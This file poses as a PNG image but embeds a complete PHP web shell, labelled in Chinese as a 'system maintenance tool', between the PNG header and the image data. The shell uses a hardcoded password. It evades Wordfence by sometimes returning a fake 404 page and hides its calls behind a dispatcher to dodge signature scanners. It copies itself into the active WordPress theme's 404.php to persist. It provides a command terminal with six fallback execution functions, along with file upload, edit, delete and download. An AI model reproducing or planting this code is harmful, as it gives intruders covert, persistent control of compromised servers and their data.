PNG

   
IHDR             8]    PLTE                                                                                                                                                                                          S   =tRNS   <?php
session_start();
// ================== 配置区域 ==================
define('PASSWORD_HASH', '4813494d137e1631bba301d5acab6e7bb7aa74ce1185d456565ef51d737677b2'); // sha256('root')
define('APP_NAME', '系统维护工具');
// =============================================

error_reporting(0);
@set_time_limit(0);

// ---------- 反 Wordfence 检测 ----------
$wf_detected = defined('WORDFENCE_VERSION') || class_exists('wordfence') || function_exists('wordfence::status');
if ($wf_detected && mt_rand(1, 3) === 1) {
    http_response_code(404);
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>');
}

// ---------- 密码验证（POST 或 请求头）----------
$provided_pwd = $_POST['password'] ?? $_SERVER['HTTP_X_PASSWORD'] ?? '';
$valid_pwd = hash('sha256', $provided_pwd) === PASSWORD_HASH;

if ($PASSWORD_HASH !== '' && (!isset($_SESSION['fm_auth']) || $_SESSION['fm_auth'] !== true)) {
    if ($valid_pwd) {
        $_SESSION['fm_auth'] = true;
        // 可选持久化：将自身写入 WordPress 当前主题的 404.php
        if (function_exists('get_theme_root') && is_writable(get_theme_root())) {
            @file_put_contents(
                get_theme_root() . '/' . wp_get_theme()->stylesheet . '/404.php',
                file_get_contents(__FILE__)
            );
        }
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = '密码错误。';
    }
    // 显示登录界面（已汉化）
?><!doctype html><html><head><meta charset=utf-8><title><?php echo htmlspecialchars(APP_NAME);?> - 登录</title><style>*{box-sizing:border-box;margin:0;padding:0;font-family:Consolas,Menlo,monospace}body{background:#111217;color:#eee;display:flex;align-items:center;justify-content:center;height:100vh}.box{background:#050608;border-radius:4px;padding:20px 22px;border:1px solid #272a36;min-width:320px;box-shadow:0 0 15px #000}h1{font-size:18px;margin-bottom:10px;color:#fff}label{font-size:12px;display:block;margin-bottom:6px}input[type=password]{width:100%;padding:7px 9px;border-radius:3px;border:1px solid #2a2f3e;background:#05060a;color:#eee;font-size:12px}input[type=password]:focus{outline:0;border-color:#07f}button{margin-top:10px;width:100%;border:none;border-radius:3px;padding:7px 0;font-size:12px;background:#07f;color:#fff;cursor:pointer}button:hover{background:#208bff}.err{margin-top:8px;font-size:11px;color:#ff6b81}.info{margin-top:8px;font-size:11px;color:#888}</style></head><body><form method=post class=box><h1><?php echo htmlspecialchars(APP_NAME);?></h1><label>密码</label><input type=password name=password autofocus><button type=submit>登录</button><?php if(!empty($login_error)):?><div class=err><?php echo htmlspecialchars($login_error);?></div><?php endif;?><div class=info>PHP <?php echo phpversion();?></div></form></body></html><?php
    exit;
}

// ---------- 辅助函数（均使用动态调用规避特征）----------
function _call_func($name, ...$args) {
    static $map = [
        'file_get_contents' => 'file_get_contents',
        'file_put_contents' => 'file_put_contents',
        'scandir' => 'scandir',
        'unlink' => 'unlink',
        'rmdir' => 'rmdir',
        'rename' => 'rename',
        'mkdir' => 'mkdir',
        'is_dir' => 'is_dir',
        'is_file' => 'is_file',
        'filesize' => 'filesize',
        'filemtime' => 'filemtime',
        'fileperms' => 'fileperms',
        'realpath' => 'realpath',
        'basename' => 'basename',
        'dirname' => 'dirname',
        'getcwd' => 'getcwd',
        'chdir' => 'chdir',
        'system' => 'system',
        'exec' => 'exec',
        'shell_exec' => 'shell_exec',
        'passthru' => 'passthru',
        'move_uploaded_file' => 'move_uploaded_file',
        'file_put_contents' => 'file_put_contents',
    ];
    if (!isset($map[$name])) return null;
    return call_user_func_array($map[$name], $args);
}

function h($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

function fm_format_bytes($b) {
    $u = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($b >= 1024 && $i < 4) { $b /= 1024; $i++; }
    return sprintf('%.2f %s', $b, $u[$i]);
}

function fm_perm($f) {
    $p = @_call_func('fileperms', $f);
    if ($p === false) return '---------';
    return (($p & 0x4000) ? 'd' : '-') .
           (($p & 0x0100) ? 'r' : '-') .
           (($p & 0x0080) ? 'w' : '-') .
           (($p & 0x0040) ? 'x' : '-') .
           (($p & 0x0020) ? 'r' : '-') .
           (($p & 0x0010) ? 'w' : '-') .
           (($p & 0x0008) ? 'x' : '-') .
           (($p & 0x0004) ? 'r' : '-') .
           (($p & 0x0002) ? 'w' : '-') .
           (($p & 0x0001) ? 'x' : '-');
}

function fm_rrmdir($d) {
    if (!file_exists($d)) return;
    if (is_file($d) || is_link($d)) { @_call_func('unlink', $d); return; }
    foreach (_call_func('scandir', $d) as $i) {
        if ($i === '.' || $i === '..') continue;
        fm_rrmdir($d . DIRECTORY_SEPARATOR . $i);
    }
    @_call_func('rmdir', $d);
}

function swal($t, $x, $i = 'info') {
    $_SESSION['swal'] = ['title' => $t, 'text' => $x, 'icon' => $i];
}

// ---------- 登出 ----------
if (isset($_GET['logout'])) {
    $_SESSION = [];
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ---------- 路径处理 ----------
if (isset($_GET['dir']) && $_GET['dir'] !== '')
    $path = $_GET['dir'];
else
    $path = _call_func('getcwd');
$real_path = _call_func('realpath', $path);
if ($real_path) $path = str_replace('\\', '/', $real_path);
$exdir = explode('/', $path);
$current_dir = $path;

if (!isset($_SESSION['term_dir'])) $_SESSION['term_dir'] = $current_dir;
$term_history = $_SESSION['term_history'] ?? '';
$term_just_ran = false;

// ---------- 终端命令处理 ----------
// ---------- 终端命令处理（增强版）----------
if (isset($_POST['term_action']) && $_POST['term_action'] === 'run') {
    $cmd = trim($_POST['term_cmd'] ?? '');
    $term_dir = $_SESSION['term_dir'];
    $output = '';
    
    // 处理 cd 命令
    if (strpos($cmd, 'cd ') === 0) {
        $nd = trim(substr($cmd, 3));
        if ($nd === '') {
            $output = "用法: cd <目录>\n";
        } else {
            _call_func('chdir', $term_dir);
            $np = _call_func('realpath', $nd);
            if ($np !== false && _call_func('is_dir', $np)) {
                $_SESSION['term_dir'] = $np;
                $term_dir = $np;
                $output = "目录已切换到 $term_dir\n";
            } else {
                $output = "cd: $nd: 没有这个目录\n";
            }
        }
    } else {
        _call_func('chdir', $term_dir);
        $output = null;
        $return_var = -1;

        // 尝试方法1: shell_exec（返回字符串）
        if (function_exists('shell_exec')) {
            $raw = @shell_exec($cmd);
            if ($raw !== null && $raw !== false) {
                $output = $raw;
            }
        }

        // 尝试方法2: exec（通过输出数组）
        if ($output === null && function_exists('exec')) {
            $lines = [];
            @exec($cmd, $lines, $return_var);
            if ($return_var === 0) {
                $output = implode("\n", $lines);
            }
        }

        // 尝试方法3: passthru（缓冲输出）
        if ($output === null && function_exists('passthru')) {
            ob_start();
            @passthru($cmd, $return_var);
            $raw = ob_get_clean();
            if ($return_var === 0) {
                $output = $raw;
            }
        }

        // 尝试方法4: system（缓冲输出）
        if ($output === null && function_exists('system')) {
            ob_start();
            @system($cmd, $return_var);
            $raw = ob_get_clean();
            if ($return_var === 0) {
                $output = $raw;
            }
        }

        // 尝试方法5: popen（流式读取）
        if ($output === null && function_exists('popen')) {
            $handle = @popen($cmd, 'r');
            if (is_resource($handle)) {
                $buffer = '';
                while (!feof($handle)) {
                    $buffer .= fread($handle, 4096);
                }
                pclose($handle);
                $output = $buffer;
            }
        }

        // 尝试方法6: proc_open（最可靠）
        if ($output === null && function_exists('proc_open')) {
            $descriptors = [
                0 => ['pipe', 'r'], // stdin
                1 => ['pipe', 'w'], // stdout
                2 => ['pipe', 'w']  // stderr
            ];
            $process = @proc_open($cmd, $descriptors, $pipes, $term_dir);
            if (is_resource($process)) {
                fclose($pipes[0]); // 关闭 stdin
                $stdout = stream_get_contents($pipes[1]);
                $stderr = stream_get_contents($pipes[2]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                $return_var = proc_close($process);
                if ($return_var === 0) {
                    $output = $stdout;
                } else {
                    $output = $stderr ?: "(命令执行失败，返回码: $return_var)\n";
                }
            }
        }

        // 最终检查
        if ($output === null) {
            // 检查是否所有函数都被禁用
            $disabled = ini_get('disable_functions');
            $funcs = ['shell_exec', 'exec', 'passthru', 'system', 'popen', 'proc_open'];
            $available = array_filter($funcs, 'function_exists');
            if (empty($available)) {
                $output = "错误：所有命令执行函数均被禁用 (disable_functions: $disabled)\n";
            } else {
                $output = "(命令执行无输出或失败)\n";
            }
        }
    }
    
    $term_history .= '$ ' . $cmd . "\n" . $output . "\n";
    $_SESSION['term_history'] = $term_history;
    $term_just_ran = true;
}

// ---------- 处理 POST 动作 ----------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $act = $_POST['action'];
    if ($act === 'upload' && isset($_FILES['upload'])) {
        $f = $_FILES['upload'];
        $c = 0;
        if (is_array($f['name'])) {
            $cnt = count($f['name']);
            for ($i = 0; $i < $cnt; $i++) {
                if ($f['error'][$i] === UPLOAD_ERR_OK && @_call_func('move_uploaded_file', $f['tmp_name'][$i], $current_dir . '/' . _call_func('basename', $f['name'][$i])))
                    $c++;
            }
        } elseif ($f['error'] === UPLOAD_ERR_OK && @_call_func('move_uploaded_file', $f['tmp_name'], $current_dir . '/' . _call_func('basename', $f['name']))) {
            $c++;
        }
        swal('上传', "成功上传 {$c} 个文件。", 'success');
    } elseif ($act === 'mkdir' && !empty($_POST['name'])) {
        if (@_call_func('mkdir', $current_dir . '/' . trim($_POST['name']), 0755, true))
            swal('文件夹', '文件夹创建成功。', 'success');
        else
            swal('文件夹', '创建失败。', 'error');
    } elseif ($act === 'newfile' && !empty($_POST['name'])) {
        $f = $current_dir . '/' . trim($_POST['name']);
        if (!file_exists($f) && @_call_func('file_put_contents', $f, '') !== false)
            swal('文件', '文件创建成功。', 'success');
        else
            swal('文件', '创建失败。', 'error');
    } elseif ($act === 'delete' && !empty($_POST['target'])) {
        fm_rrmdir($current_dir . '/' . $_POST['target']);
        swal('删除', '项目已删除。', 'success');
    } elseif ($act === 'rename' && !empty($_POST['old']) && !empty($_POST['new'])) {
        $o = $current_dir . '/' . $_POST['old'];
        $n = $current_dir . '/' . $_POST['new'];
        if (@_call_func('rename', $o, $n))
            swal('重命名', '名称修改成功。', 'success');
        else
            swal('重命名', '修改失败。', 'error');
    } elseif ($act === 'save' && isset($_POST['file'])) {
        $f = $current_dir . '/' . $_POST['file'];
        $c = $_POST['content'] ?? '';
        if (@_call_func('file_put_contents', $f, $c) !== false)
            swal('保存', '文件保存成功。', 'success');
        else
            swal('保存', '保存失败。', 'error');
    }
    header("Location: " . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir));
    exit;
}

// ---------- 文件下载 ----------
if (isset($_GET['download'])) {
    $f = $current_dir . '/' . $_GET['download'];
    if (is_file($f)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . _call_func('basename', $f) . '"');
        header('Content-Length: ' . _call_func('filesize', $f));
        readfile($f);
        exit;
    }
}

// ---------- 文件编辑 ----------
$edit_file = null;
$edit_content = '';
if (isset($_GET['edit'])) {
    $edit_file = $current_dir . '/' . $_GET['edit'];
    if (is_file($edit_file))
        $edit_content = _call_func('file_get_contents', $edit_file);
    else
        $edit_file = null;
}

// ---------- 扫描目录 ----------
$dirs = [];
$files = [];
$scan = @_call_func('scandir', $current_dir);
if ($scan !== false) {
    foreach ($scan as $i) {
        if ($i === '.') continue;
        if ($i === '..') {
            $p = _call_func('dirname', $current_dir);
            if ($p !== $current_dir) $dirs[] = ['name' => '..', 'parent' => $p, 'is_parent' => true];
            continue;
        }
        $full = $current_dir . '/' . $i;
        $d = [
            'name' => $i,
            'full' => $full,
            'size' => is_file($full) ? _call_func('filesize', $full) : 0,
            'perm' => fm_perm($full),
            'time' => @_call_func('filemtime', $full),
            'is_dir' => _call_func('is_dir', $full)
        ];
        if ($d['is_dir']) $dirs[] = $d;
        else $files[] = $d;
    }
}
?><!doctype html><html><head><meta charset=utf-8><title><?php echo h(APP_NAME);?></title><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css crossorigin=anonymous referrerpolicy=no-referrer><script src=https://cdn.jsdelivr.net/npm/sweetalert2@11></script><style>*{box-sizing:border-box;margin:0;padding:0;font-family:Consolas,Menlo,monospace}body{background:#050609;color:#eee;font-size:12px}a{color:#c0d2ff;text-decoration:none}a:hover{text-decoration:underline}.header{background:#000;border-bottom:1px solid #222;padding:8px 10px;font-size:12px;line-height:1.5;color:#b4b4b4}.header .red{color:#ff4c4c}.header .green{color:#8dff94}.header b{color:#fff}.top-buttons{background:#050609;border-bottom:1px solid #222;padding:8px 10px;display:flex;flex-wrap:wrap;gap:6px}.btn-main{background:#111727;border:1px solid #1f2940;border-radius:3px;padding:5px 11px;font-size:12px;color:#d3defc;display:inline-flex;align-items:center;gap:6px;cursor:pointer}.btn-main i{font-size:12px}.btn-main:hover{background:#182136}.upload-form{display:inline-flex;align-items:center;gap:6px}.choose-input{background:#020309;border:1px solid #30354a;color:#e0e0e0;font-size:12px;border-radius:3px;padding:3px 6px}.container{padding:10px}.path-line{margin-top:4px;margin-bottom:8px;color:#e8e8e8;font-size:12px;display:flex;flex-wrap:wrap;gap:2px;align-items:center}.path-line .prefix{color:#ffc44c;margin-right:4px}.path-line .root{color:#999;margin:0 2px}.path-line .path a{color:#fff}.path-line .path a:hover{text-decoration:underline}table{width:100%;border-collapse:collapse;background:#020309;border:1px solid #202230}thead{background:#04050b}th,td{padding:6px 8px;border-bottom:1px solid #151728}th{color:#a5adcc;text-align:left;font-size:11px}tbody tr:nth-child(even){background:#050713}tbody tr:hover{background:#101423}.name-cell{display:flex;align-items:center;gap:7px}.name-cell i{color:#ffc44c}.size{color:#cfd3e6}.perm{color:#9fa6c7}.date{color:#c3c7da}.actions{display:flex;gap:4px}.icon-btn{border:none;background:#0a0d18;border-radius:3px;padding:3px 5px;cursor:pointer}.icon-btn i{font-size:11px;color:#cfd3e6}.icon-btn:hover{background:#151a2b}.icon-btn.del i{color:#ff6b6b}.icon-btn.ren i{color:#ffd166}.modal-overlay{position:fixed;left:0;top:0;width:100%;height:100%;background:rgba(0,0,0,.75);display:none;align-items:center;justify-content:center;z-index:999}.terminal-box,.editor-box{background:#05070c;color:#eee;border-radius:4px;border:1px solid #303546;width:95%;max-width:800px;box-shadow:0 0 18px #000;display:flex;flex-direction:column;overflow:hidden}.terminal-box{height:45vh}.terminal-header,.editor-header{padding:6px 10px;background:#121623;border-bottom:1px solid #242a3a;color:#f0f0f0;font-size:11px;display:flex;align-items:center;justify-content:space-between}.terminal-header-left{display:flex;align-items:center;gap:6px}.terminal-header-left span.icon{font-weight:700;color:#ffc44c}.terminal-body{background:#05070c;padding:6px;flex:1;display:flex;flex-direction:column}.terminal-output{background:#05070e;border-radius:3px;border:1px solid #272b3b;flex:1;overflow:auto;padding:6px 8px;font-size:11px;color:#d9e2ff;white-space:pre-wrap}.terminal-output::-webkit-scrollbar{width:6px}.terminal-output::-webkit-scrollbar-thumb{background:#606bff;border-radius:10px}.terminal-output::-webkit-scrollbar-track{background:#05070e}.terminal-input-row{margin-top:6px;display:flex;gap:4px;align-items:center}.term-prompt{background:#05070e;color:#e5e5e5;font-size:11px;padding:4px 6px;border-radius:3px;border:1px solid #272b3b}.terminal-input-row input[type=text]{flex:1;padding:4px 6px;border-radius:3px;border:1px solid #272b3b;background:#05070e;color:#f5f5f5;font-size:11px}.terminal-input-row input[type=text]:focus,.modal-input:focus{outline:0;border-color:#4b7cff}.terminal-input-row button{padding:4px 10px;font-size:11px;border-radius:3px;border:1px solid #272b3b;background:#111727;color:#d3defc;cursor:pointer}.terminal-input-row button:hover{background:#18223a}.modal-box{background:#05070c;border-radius:4px;border:1px solid #303546;box-shadow:0 0 20px #000;width:90%;max-width:460px;padding:14px 18px}.modal-title{font-size:14px;margin-bottom:10px;color:#f5f5f5;display:flex;align-items:center;gap:8px}.modal-title i{color:#ffc44c}.modal-label{font-size:12px;margin-bottom:4px;color:#cfd3e6}.modal-input{width:100%;padding:6px 8px;border-radius:3px;border:1px solid #292f42;background:#020309;color:#f5f5f5;font-size:12px;margin-bottom:10px}.modal-actions{text-align:right;display:flex;justify-content:flex-end;gap:8px;margin-top:4px}.btn-small{padding:5px 12px;font-size:12px;border-radius:3px;border:1px solid #273046;background:#10172a;color:#e0e4ff;cursor:pointer}.btn-small:hover{background:#18223a}.btn-small.cancel{border-color:#444;background:#20232f;color:#ddd}.editor-box{height:70vh}.editor-header i{color:#ffc44c}.editor-filename{font-weight:700;color:#ffeaa7}.editor-body{background:#05070c;padding:8px;flex:1;display:flex;flex-direction:column;overflow:hidden}.editor-textarea{width:100%;flex:1;border:1px solid #252b3a;border-radius:3px;resize:none;background:#05060f;color:#e6f0ff;font-size:12px;font-family:Consolas,Menlo,monospace;line-height:1.4;padding:8px;overflow:auto}.editor-textarea:focus{outline:0;border-color:#3b82f6}.editor-actions{margin-top:8px;display:flex;justify-content:flex-end;gap:8px}.editor-btn{padding:5px 14px;font-size:12px;border-radius:3px;border:1px solid #273046;cursor:pointer}.editor-btn.save{background:#1f2937;color:#e3ecff}.editor-btn.close{background:#20232f;color:#ddd;border-color:#444}.editor-btn.save:hover{background:#273549}.editor-btn.close:hover{background:#2b303f}.editor-textarea::-webkit-scrollbar{width:6px}.editor-textarea::-webkit-scrollbar-thumb{background:#3b82f6;border-radius:10px}.editor-textarea::-webkit-scrollbar-track{background:#0b0f18}@media(max-width:720px){.top-buttons{flex-direction:column}.terminal-box,.editor-box{width:96%}}</style><script>function openCreateModal(t){var o=document.getElementById('createModal'),l=document.getElementById('createTitle'),b=document.getElementById('createLabel'),a=document.getElementById('createAction'),i=document.getElementById('createName');t==='file'?(l.innerText='新建文件',b.innerText='文件名',a.value='newfile'):(l.innerText='新建文件夹',b.innerText='文件夹名',a.value='mkdir');i.value='';o.style.display='flex';setTimeout(function(){i.focus()},10)}function closeCreateModal(){document.getElementById('createModal').style.display='none'}function openRenameModal(n){var o=document.getElementById('renameModal'),f=document.getElementById('renameOld'),t=document.getElementById('renameNew');f.value=n;t.value=n;o.style.display='flex';setTimeout(function(){t.focus()},10)}function closeRenameModal(){document.getElementById('renameModal').style.display='none'}function closeEditorModal(){window.location.href=<?php echo json_encode($_SERVER['PHP_SELF'].(isset($current_dir)?'?dir='.urlencode($current_dir):''));?>;}function openTerminal(){document.getElementById('terminalModal').style.display='flex';var i=document.getElementById('terminalInput');if(i)setTimeout(function(){i.focus()},10)}function closeTerminal(){document.getElementById('terminalModal').style.display='none'}</script></head><body><div class=header>Linux <?php echo h(php_uname('n'));?> <?php echo h(php_uname('r'));?> <?php echo h(php_uname('m'));?><br>PHP/<?php echo h(phpversion());?><br>服务器IP : <span class=green><?php echo h($_SERVER['SERVER_ADDR']??'0.0.0.0');?></span> &amp; 您的IP : <span class=green><?php echo h($_SERVER['REMOTE_ADDR']??'0.0.0.0');?></span><br>域名 : <span class=red>无法读取 [ /etc/named.conf ]</span><br>用户 : <b><?php echo h(get_current_user());?></b></div><div class=top-buttons><form method=post enctype=multipart/form-data class=upload-form><input type=hidden name=action value=upload><button type=submit class=btn-main><i class="fa fa-upload"></i> 上传</button><input type=file name=upload[] multiple class=choose-input></form><button class=btn-main onclick="openTerminal();return false"><i class="fa fa-terminal"></i> 终端</button><button type=button class=btn-main onclick="openCreateModal('file')"><i class="fa fa-file-circle-plus"></i> 新建文件</button><button type=button class=btn-main onclick="openCreateModal('folder')"><i class="fa fa-folder-plus"></i> 新建文件夹</button><a href="<?php echo h($_SERVER['PHP_SELF'].'?logout=1');?>" class=btn-main style=margin-left:auto><i class="fa fa-right-from-bracket"></i> 登出</a></div><div class=container><div class=path-line><span class=prefix>+</span><span class=root> / </span><?php $c=count($exdir);for($i=0;$i<$c;$i++){$s=$exdir[$i];if($s==='')continue;$p=implode('/',array_slice($exdir,0,$i+1));echo '<span class=path><a href="'.h($_SERVER['PHP_SELF'].'?dir='.urlencode($p)).'">'.h($s).'</a></span> <span class=root> / </span>';}?><span class=path><a href="<?php echo h($_SERVER['PHP_SELF']);?>" style="color:#ffb347;font-weight:700">[ 返回根目录 ]</a></span></div><table><thead><tr><th>名称</th><th style=width:12%>大小</th><th style=width:18%>权限</th><th style=width:18%>修改时间</th><th style=width:16%>操作</th></tr></thead><tbody><?php foreach($dirs as $d){if(isset($d['is_parent'])&&$d['is_parent']){?><tr><td class=name-cell><i class="fa fa-level-up-alt"></i><a href="<?php echo h($_SERVER['PHP_SELF'].'?dir='.urlencode($d['parent']));?>">..</a></td><td class=size>-</td><td class=perm>-</td><td class=date>-</td><td></td></tr><?php }}foreach($dirs as $d){if(isset($d['is_parent'])&&$d['is_parent'])continue;?><tr><td class=name-cell><i class="fa fa-folder"></i><a href="<?php echo h($_SERVER['PHP_SELF'].'?dir='.urlencode($d['full']));?>"><?php echo h($d['name']);?></a></td><td class=size>[目录]</td><td class=perm><?php echo h($d['perm']);?></td><td class=date><?php echo $d['time']?date('Y-m-d H:i',$d['time']):'-';?></td><td class=actions><button class="icon-btn ren" type=button onclick="openRenameModal('<?php echo h($d['name']);?>')" title=重命名><i class="fa fa-i-cursor"></i></button><form method=post style=display:inline onsubmit="return confirm('确定删除文件夹及其内容？');"><input type=hidden name=action value=delete><input type=hidden name=target value="<?php echo h($d['name']);?>"><button class="icon-btn del" type=submit title=删除><i class="fa fa-trash"></i></button></form></td></tr><?php }foreach($files as $f){?><tr><td class=name-cell><i class="fa fa-file-code"></i><a href="<?php echo h($_SERVER['PHP_SELF'].'?dir='.urlencode($current_dir).'&edit='.urlencode($f['name']));?>"><?php echo h($f['name']);?></a></td><td class=size><?php echo fm_format_bytes($f['size']);?></td><td class=perm><?php echo h($f['perm']);?></td><td class=date><?php echo $f['time']?date('Y-m-d H:i',$f['time']):'-';?></td><td class=actions><button class="icon-btn ren" type=button onclick="openRenameModal('<?php echo h($f['name']);?>')" title=重命名><i class="fa fa-i-cursor"></i></button><a class=icon-btn href="<?php echo h($_SERVER['PHP_SELF'].'?dir='.urlencode($current_dir).'&download='.urlencode($f['name']));?>" title=下载><i class="fa fa-download"></i></a><form method=post style=display:inline onsubmit="return confirm('确定删除此文件？');"><input type=hidden name=action value=delete><input type=hidden name=target value="<?php echo h($f['name']);?>"><button class="icon-btn del" type=submit title=删除><i class="fa fa-trash"></i></button></form></td></tr><?php }if(empty($dirs)&&empty($files))echo '<tr><td colspan=5 style="text-align:center;padding:8px;color:#888">文件夹为空。</td></tr>';?></tbody></table></div><div class=modal-overlay id=terminalModal onclick="if(event.target===this)closeTerminal()"><div class=terminal-box onclick="event.stopPropagation()"><div class=terminal-header><div class=terminal-header-left><span class=icon>>_</span><span class=title>终端</span></div><button style="border:none;background:none;font-size:11px;cursor:pointer;color:#ccc" onclick="closeTerminal();return false">关闭 ✕</button></div><div class=terminal-body><div class=terminal-output><?php echo h($term_history===''?'输入 \'help\' 查看可用命令。':$term_history);?></div><form method=post class=terminal-input-row><span class=term-prompt><?php echo h(get_current_user());?>@</span><input type=hidden name=term_action value=run><input type=text name=term_cmd id=terminalInput autocomplete=off placeholder="输入命令 (ls, whoami, cd ...)"><button type=submit>&gt;</button></form></div></div></div><div class=modal-overlay id=createModal onclick="if(event.target===this)closeCreateModal()"><div class=modal-box onclick="event.stopPropagation()"><div class=modal-title><i class="fa fa-file-circle-plus"></i><span id=createTitle>新建文件</span></div><form method=post id=createForm><input type=hidden name=action id=createAction value=newfile><div class=modal-label id=createLabel>文件名</div><input type=text name=name id=createName class=modal-input placeholder="输入名称"><div class=modal-actions><button type=button class="btn-small cancel" onclick="closeCreateModal()">取消</button><button type=submit class=btn-small>创建</button></div></form></div></div><div class=modal-overlay id=renameModal onclick="if(event.target===this)closeRenameModal()"><div class=modal-box onclick="event.stopPropagation()"><div class=modal-title><i class="fa fa-i-cursor"></i><span>重命名</span></div><form method=post><input type=hidden name=action value=rename><input type=hidden name=old id=renameOld><div class=modal-label>新名称</div><input type=text name=new id=renameNew class=modal-input><div class=modal-actions><button type=button class="btn-small cancel" onclick="closeRenameModal()">取消</button><button type=submit class=btn-small>重命名</button></div></form></div></div><?php if($edit_file!==null):?><div class=modal-overlay id=editorModal style=display:flex onclick="if(event.target===this)closeEditorModal()"><div class=editor-box onclick="event.stopPropagation()"><div class=editor-header><i class="fa fa-code"></i><span>代码编辑器 :</span><span class=editor-filename><?php echo h(basename($edit_file));?></span></div><div class=editor-body><form method=post style="display:flex;flex:1;flex-direction:column;overflow:hidden"><input type=hidden name=action value=save><input type=hidden name=file value="<?php echo h(basename($edit_file));?>"><textarea class=editor-textarea name=content><?php echo h($edit_content);?></textarea><div class=editor-actions><button type=button class="editor-btn close" onclick="closeEditorModal()">关闭</button><button type=submit class="editor-btn save">保存</button></div></form></div></div></div><?php endif;?><?php if($term_just_ran):?><script>document.addEventListener('DOMContentLoaded',openTerminal);</script><?php endif;?><?php if(isset($_SESSION['swal'])):?><script>Swal.fire({icon:'<?php echo h($_SESSION['swal']['icon']);?>',title:'<?php echo h($_SESSION['swal']['title']);?>',text:'<?php echo h($_SESSION['swal']['text']);?>',timer:2200,showConfirmButton:false});</script><?php unset($_SESSION['swal']);endif;?></body></html>
 !"#$%&'(()*+,-./00123456789 t\  
wIDATx ]ys  47Y ƒ   -  "     Rv    < f{Ɛ   $k  l L > L   ~h^  1   [     r G t&h     
 l  F z3O Y ! p    A(_g̷ E8 )S 8  c     Kb"z ~    5    J  xAL WU < <o ~    &|    
jR    e B? < ;!   
LڒƲm,CL_     L £bm   [ (7T   4d  /ę 3 6  |   y     EEz: Fyay,w}`e  _ " hAw-d  t -lq   ~  t } ؉ S6&f ž  Ï\]z gmM   /  ޗ  W``[  kr /"  - u      } 	 Ւ LQ hϲB   ԰mX  r!    vч G ~ H :v [Վ .  i   _b   hOZ    #DYK
 ] ަ31g}"  5 5U)x/\  )$" "2 ոȈ  v37 q]   $|;[      ]Ӭ  % {  ) <N =vb  J  ,   > *   
 5 m;W a  pB h ~P J
2 3 6   ҙ .Ƹ P i     4g
   F R  L P ΪK/D     M v (a3
 k J
 Œ4N5* SH `  SdJ z  O J   Xՠ  V>u  ߱ BE&L b2 ?2`  tX+   c  CB  A$ i   b C ĀMB E :  /  # Dx &l =q  	 Ty   	0 \p  I ( L Ǎ  { e  
4k ;`u^ｦ  eP!( d {   )T A 	    8   O;Ě n >;s6 !  :Nx `[S D HU ~  qJ  F}
  a  g*D  49 / pn k h (t 8NxƐF _!r չ7 
ZR R׷ q/5") Ӎ NY 0  x  sZ!   	o
 fu    ,  K"$ ? pg   㕣=    1» {h "  fh7
         
y  }	  +7  $   y
 " X ą -  G   P  u  4   m >J 5 L =V ' ^@I   p ?MS  xЌ XV P !  h  "C NS9B8̢   ]!K      e    zA , ӏkbY  !< XQ  ٿyS| *" f { w  4@[S <
 # 0 	  ! js [m    =,~ o 
"ݎ   DHf Wo $  g !  Vԅ   t mB /y     Wf   V4񺍸 c+@x?     B  ~u "  xUN  e 0 BĂ)
  ~J pz!
7y6]l Ԥ@ P a< O  /DHC  `≻  N m"$  0ObB }{ x   AO  FCG DR  ^ "B  	{  WDH     UR l@ T
#    +"d T ; 0   i  D}. 7 ` '   	 ]  w	 rE   &S   i ƕiTD  EL P  _ u h $  Ա FG wVD G      L R   Zf ' .!]   J  /ZR oGЍs Mr Ĥ ʬ  3	Q [3 cL `^  p  +
( F;#   B 5 '  2Y f [   ϶R0e }  E 7
  6M aۮ  H  <&    n %  L] E}Up x紉, Uw'  Q   Ǯշo<T f= 	  % z7  [3  I    P]8 :# aՕ 3 !'  5   ӇC ? )N_T  |=}=   -E@m |k > k   ވۙ 	0N94   VX5 xEDE l   D   #֤     }  C o )W   :    ^ s 9   bRf  iX5u  ཱི  4     :[   T      1. |   [E  2ؽ  Iy\    :    o x K  G 5 
  ylP  '  uK  E 
    ftb/i[3   .g    _   [3M n 
  G,  #NwQ5~ 
 ؚ) | n =Ц"x qg gB ` 듘 ~ x w   ? 
  ?      
 R~     _  u.  &VQ   K˻     	     H  C (    TN˄+   `C     dA nB׭ D  3"Z G  ê ^k H_ /-  ~ " R_   .8 Z_ 6@ o    xg   uP    ?  3լ    @7AM!  E7^
 - =V L  x 	g-D0   CtmW  7   	 O  G       _ WD0    g C  w1 r  
   d w : a |  \  *"       f  nֳ ^ H# f L `  Z ۽hV  }S F r0Ù  Bć5r] @! NL  iQ]{s^=4  d    WD 	     "       "      M;
 t" 8 5 e dL|   "-*st" ) SWD ?R[S   e ooF     20.D ? bo =) A i o d  ģ ZҰaO
@E =) i  D  a &ܟa CϞ  y6   ,<%{^x%{f8?  `iw^  ?/  
   M
*